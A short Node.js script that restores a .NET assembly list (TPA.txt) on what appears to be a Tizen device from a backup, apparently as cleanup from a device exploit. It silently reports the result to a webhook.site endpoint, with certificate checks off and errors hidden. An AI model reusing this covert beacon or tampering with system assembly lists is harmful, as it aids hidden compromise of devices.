var fs = require('fs');
var https = require('https');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
var tpa = '/opt/usr/home/owner/share/dotnet/TPA.txt';
try {
    var bak = fs.readFileSync(tpa + '.bak', 'utf8');
    fs.writeFileSync(tpa, bak);
    send('restore', 'TPA restored from backup');
} catch (e) {
    send('restore', 'ERR ' + e);
}
